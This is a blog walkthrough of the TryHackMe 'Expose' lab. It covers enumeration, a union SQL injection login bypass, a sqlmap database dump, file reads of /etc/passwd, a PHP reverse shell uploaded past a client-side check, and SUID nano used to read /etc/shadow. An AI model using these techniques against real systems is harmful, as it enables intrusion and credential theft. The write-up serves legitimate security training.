---
title: "Expose Writeup THM"
description: "My writeup of the TryHackMe room [Expose](https://tryhackme.com/room/expose)"
date: 2024-01-28 15:00:00
image: https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
categories:
    - Room
    - Easy
---

First of all I am going to start with an nmap scan:

```bash
nmap -sC -sV -p- 10.10.229.207

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 07:58 EST
Nmap scan report for 10.10.229.207
Host is up (0.055s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.65.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9c:ef:fe:df:c3:55:d8:25:47:76:64:01:dc:93:53:50 (RSA)
|   256 c9:45:fb:a7:e9:ae:2c:48:46:8f:86:82:64:a0:20:d0 (ECDSA)
|_  256 9b:25:8f:19:62:39:c6:05:ef:e5:f6:02:3f:c0:12:30 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/load/bytes/received/5min: 13.55
|     $SYS/broker/publish/bytes/sent: 63
|     $SYS/broker/load/sockets/5min: 0.57
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/load/messages/sent/1min: 13.71
|     $SYS/broker/retained messages/count: 35
|     $SYS/broker/load/bytes/sent/1min: 406.59
|     $SYS/broker/load/sockets/15min: 0.20
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/messages/received: 3
|     $SYS/broker/store/messages/bytes: 149
|     $SYS/broker/bytes/sent: 445
|     $SYS/broker/load/messages/received/1min: 2.74
|     $SYS/broker/load/bytes/received/15min: 4.57
|     $SYS/broker/bytes/received: 69
|     $SYS/broker/heap/maximum: 51456
|     $SYS/broker/load/messages/sent/15min: 0.99
|     $SYS/broker/load/publish/sent/1min: 10.96
|     $SYS/broker/load/connections/5min: 0.39
|     $SYS/broker/publish/messages/sent: 12
|     $SYS/broker/load/messages/received/5min: 0.59
|     $SYS/broker/clients/maximum: 1
|     $SYS/broker/clients/connected: 1
|     $SYS/broker/messages/sent: 15
|     $SYS/broker/load/connections/15min: 0.13
|     $SYS/broker/uptime: 132 seconds
|     $SYS/broker/messages/stored: 32
|     $SYS/broker/load/publish/sent/15min: 0.80
|     $SYS/broker/clients/active: 1
|     $SYS/broker/clients/total: 1
|     $SYS/broker/load/publish/sent/5min: 2.36
|     $SYS/broker/subscriptions/count: 2
|     $SYS/broker/store/messages/count: 32
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/messages/sent/5min: 2.95
|     $SYS/broker/load/bytes/sent/15min: 29.49
|     $SYS/broker/load/messages/received/15min: 0.20
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/load/sockets/1min: 2.43
|     $SYS/broker/load/bytes/received/1min: 63.04
|     $SYS/broker/heap/current: 51056
|_    $SYS/broker/load/bytes/sent/5min: 87.39
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.47 seconds
```

We already got some important information:

- FTP server on port 21 with anonymous login allowed,
- There is a dns server,
- A web page on port 1337,
- And mosquitto is running on port 1883.

The web page just shows the name  of the room.

We can start a fuzzer for subdirectory enumeration:

```bash
ffuf -u 'http://10.10.229.207:1337/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.229.207:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms]
javascript              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 59ms]
phpmyadmin              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 58ms]
```

Admin seems like a fake page, I tried to type some emails and password and I don’t receive any response, so the real one must be phpmyadmin.

After I tried using default credentials, I tried going back to the enumeration part and using a bigger wordlist, and I actually found another directory:

```bash
ffuf -u 'http://10.10.229.207:1337/FUZZ' -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.229.207:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2901ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3911ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms]
admin_101               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 56ms]
javascript              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 55ms]
phpmyadmin              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 54ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 57ms]
:: Progress: [20469/20469] :: Job [1/1] :: 704 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

And we got something valueable:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png)

First of all now we know that the domain is root.thm,

we can change that by editing the /etc/hosts file:

```bash
127.0.0.1       localhost
127.0.1.1       kali
10.10.229.207   root.thm
```

And we can now navigate with the dns name:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%201.png)

That’s good because now we can start fuzzing the subdomains.

After trying for some time, I ended up with nothing, so I am going to try brute forcing the login panel instead.

This also didn’t seem to go anywhere, so maybe I could try with sql injection.

I tried to put a comment: `— -`

And I got an error message:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%202.png)

After trying to do something manually,

and I managed to enter into the application using an union sql

```bash
hacker' union select null,null,null,null#
```

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%203.png)

I don’t really care about the application, but I could use this union sql to gain some credentials.

After trying for a while, I didn’t manage to reflect the output of the message so that was useless.

I eventually switched to sqlmap:

First of all I captured the request in a file using BURP

and then I used sqlmap to dump the database:

```bash
sqlmap -r req.txt -dump
```

| id | email | created | password |
| --- | --- | --- | --- |
| 1 | hacker@root.thm | 2023-02-21 09:05:46 | <redacted> |

And I found his password.

I also found two more interesting things:

| id | url | password |
| --- | --- | --- |
| 1 | /file1010111/index.php | <redacted>(<redacted>) |
| 3 | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z  |

We can navigate to the first url and put the password found with the sqlmap scan:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%204.png)

The site just says:

```bash
Parameter Fuzzing is also important :) or Can you hide DOM elements?
```

Apparently the parameter in question is “?file”

So maybe we can use that to read files in the system:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash

ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

And it worked, so now we have the password for the second page:

which is the user zeamkish.

Now we can upload a file:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%205.png)

And after uploading a file we can go to the source code to see where it is stored:

```bash
<h1>File uploaded successfully! Maybe look in source code to see the path<span style=" display: none;">in /upload_thm_1001 folder</span> <h1>
```

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%206.png)

And it was in fact in the http://10.10.229.207:1337/upload-cv00101011/upload_thm_1001/ folder.

Now I took the pentestermonkey php reverse shell, and tried to upload it, but it doesn’t do anything, this is because of this function:

```bash
function validate(){

 var fileInput = document.getElementById('file');
  var file = fileInput.files[0];

  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();

    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
```

But now we know that it’s a client restriction, so it’s easy to bypass:

We can just rename the shell rev.png, upload it and intercept the request:

and then we just change the name to rev.php again

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%207.png)

And we can see that it worked:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%208.png)

Before opening the file I started a listener using nc

And we are now in the machine with the www-data account:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.229.207] 56016
Linux ip-10-10-229-207 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 14:43:16 up  1:46,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (782): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-229-207:/$
```

We also have python so I am going to upgrade my shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

And after entering the zeamkish folder I noticed that he has the credentials for the ssh in plaintext:

```bash
ls -la
total 36
drwxr-xr-x 3 zeamkish zeamkish 4096 Jul  6  2023 .
drwxr-xr-x 4 root     root     4096 Jun 30  2023 ..
-rw-rw-r-- 1 zeamkish zeamkish    5 Jul  6  2023 .bash_history
-rw-r--r-- 1 zeamkish zeamkish  220 Jun  8  2023 .bash_logout
-rw-r--r-- 1 zeamkish zeamkish 3771 Jun  8  2023 .bashrc
drwx------ 2 zeamkish zeamkish 4096 Jun  8  2023 .cache
-rw-r--r-- 1 zeamkish zeamkish  807 Jun  8  2023 .profile
-rw-r----- 1 zeamkish zeamkish   27 Jun  8  2023 flag.txt
-rw-rw-r-- 1 root     zeamkish   34 Jun 11  2023 ssh_creds.txt
$ cat ssh_creds.txt
cat ssh_creds.txt
SSH CREDS
zeamkish
<redacted>
```

So now we are in as zeamkish and we can read the flag:

```bash
ssh zeamkish@10.10.229.207

zeamkish@10.10.229.207's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 28 14:48:35 UTC 2024

  System load:  0.0               Processes:             130
  Usage of /:   7.5% of 58.09GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.229.207
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Jul  2 17:27:46 2023 from 10.10.83.109
zeamkish@ip-10-10-229-207:~$ whoami
zeamkish
zeamkish@ip-10-10-229-207:~$ ls
flag.txt  ssh_creds.txt
zeamkish@ip-10-10-229-207:~$ cat flag.txt
THM{<redacted>}
```

After some enumeration I found a SUID set:

```bash
zeamkish@ip-10-10-229-207:/home/ubuntu/sqlmap$ find / -type f -perm -04000 -ls 2>/dev/null
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
       66     40 -rwsr-xr-x   1 root     root               40152 Jun 14  2022 /snap/core/15511/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/15511/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/15511/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Nov 29  2022 /snap/core/15511/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jun 14  2022 /snap/core/15511/bin/umount
     2646     71 -rwsr-xr-x   1 root     root               71824 Nov 29  2022 /snap/core/15511/usr/bin/chfn
     2648     40 -rwsr-xr-x   1 root     root               40432 Nov 29  2022 /snap/core/15511/usr/bin/chsh
     2725     74 -rwsr-xr-x   1 root     root               75304 Nov 29  2022 /snap/core/15511/usr/bin/gpasswd
     2817     39 -rwsr-xr-x   1 root     root               39904 Nov 29  2022 /snap/core/15511/usr/bin/newgrp
     2830     53 -rwsr-xr-x   1 root     root               54256 Nov 29  2022 /snap/core/15511/usr/bin/passwd
     2940    134 -rwsr-xr-x   1 root     root              136808 Jan 17  2023 /snap/core/15511/usr/bin/sudo
     3039     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 26  2022 /snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3411    419 -rwsr-xr-x   1 root     root              428240 Oct  7  2022 /snap/core/15511/usr/lib/openssh/ssh-keysign
     6485    125 -rwsr-xr-x   1 root     root              127656 May 27  2023 /snap/core/15511/usr/lib/snapd/snap-confine
     7673    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/15511/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jun 14  2022 /snap/core/15419/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/15419/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/15419/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Nov 29  2022 /snap/core/15419/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jun 14  2022 /snap/core/15419/bin/umount
     2607     71 -rwsr-xr-x   1 root     root               71824 Nov 29  2022 /snap/core/15419/usr/bin/chfn
     2609     40 -rwsr-xr-x   1 root     root               40432 Nov 29  2022 /snap/core/15419/usr/bin/chsh
     2686     74 -rwsr-xr-x   1 root     root               75304 Nov 29  2022 /snap/core/15419/usr/bin/gpasswd
     2778     39 -rwsr-xr-x   1 root     root               39904 Nov 29  2022 /snap/core/15419/usr/bin/newgrp
     2791     53 -rwsr-xr-x   1 root     root               54256 Nov 29  2022 /snap/core/15419/usr/bin/passwd
     2901    134 -rwsr-xr-x   1 root     root              136808 Jan 17  2023 /snap/core/15419/usr/bin/sudo
     3000     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 26  2022 /snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3372    419 -rwsr-xr-x   1 root     root              428240 Oct  7  2022 /snap/core/15419/usr/lib/openssh/ssh-keysign
     6446    125 -rwsr-xr-x   1 root     root              127656 May 12  2023 /snap/core/15419/usr/lib/snapd/snap-confine
     7634    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/15419/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2785/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2785/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Nov 29  2022 /snap/core18/2785/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2785/bin/umount
     1754     75 -rwsr-xr-x   1 root     root               76496 Nov 29  2022 /snap/core18/2785/usr/bin/chfn
     1756     44 -rwsr-xr-x   1 root     root               44528 Nov 29  2022 /snap/core18/2785/usr/bin/chsh
     1809     75 -rwsr-xr-x   1 root     root               75824 Nov 29  2022 /snap/core18/2785/usr/bin/gpasswd
     1873     40 -rwsr-xr-x   1 root     root               40344 Nov 29  2022 /snap/core18/2785/usr/bin/newgrp
     1886     59 -rwsr-xr-x   1 root     root               59640 Nov 29  2022 /snap/core18/2785/usr/bin/passwd
     1977    146 -rwsr-xr-x   1 root     root              149080 Apr  4  2023 /snap/core18/2785/usr/bin/sudo
     2065     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 25  2022 /snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2375    427 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /snap/core18/2785/usr/lib/openssh/ssh-keysign
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2751/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2751/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Nov 29  2022 /snap/core18/2751/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2751/bin/umount
     1728     75 -rwsr-xr-x   1 root     root               76496 Nov 29  2022 /snap/core18/2751/usr/bin/chfn
     1730     44 -rwsr-xr-x   1 root     root               44528 Nov 29  2022 /snap/core18/2751/usr/bin/chsh
     1783     75 -rwsr-xr-x   1 root     root               75824 Nov 29  2022 /snap/core18/2751/usr/bin/gpasswd
     1847     40 -rwsr-xr-x   1 root     root               40344 Nov 29  2022 /snap/core18/2751/usr/bin/newgrp
     1860     59 -rwsr-xr-x   1 root     root               59640 Nov 29  2022 /snap/core18/2751/usr/bin/passwd
     1951    146 -rwsr-xr-x   1 root     root              149080 Apr  4  2023 /snap/core18/2751/usr/bin/sudo
     2039     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 25  2022 /snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2349    427 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /snap/core18/2751/usr/lib/openssh/ssh-keysign
    10732     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    25779    464 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /usr/lib/openssh/ssh-keysign
    13935     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     7044    144 -rwsr-xr-x   1 root     root              146888 May 29  2023 /usr/lib/snapd/snap-confine
     9161     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
    13933     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
    16077    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
     5576     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount
     9166     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9165     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
     3189     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     9163     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
     2136    316 -rwsr-xr-x   1 root     root              320136 Apr 10  2020 /usr/bin/nano
    10845     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     1571    316 -rwsr-x---   1 root     zeamkish          320160 Feb 18  2020 /usr/bin/find
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     5210     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount
```

We can see that we can run nano with root privileges.

I tried to gain a root shell but failed, so I just went and read the file of the shadow and password:

```bash
/usr/bin/nano /etc/shadow

root:<redacted>:19519:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19502::::::
ubuntu:<redacted>:19519:0:99999:7:::
lxd:!:19502::::::
mysql:!:19502:0:99999:7:::
zeamkish:<redacted>:19516:0:99999:7:::
ftp:*:19519:0:99999:7:::
bind:*:19523:0:99999:7:::
Debian-snmp:!:19523:0:99999:7:::
redis:*:19523:0:99999:7:::
mosquitto:*:19523:0:99999:7:::
fwupd-refresh:*:19544:0:99999:7:::

/usr/bin/nano /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
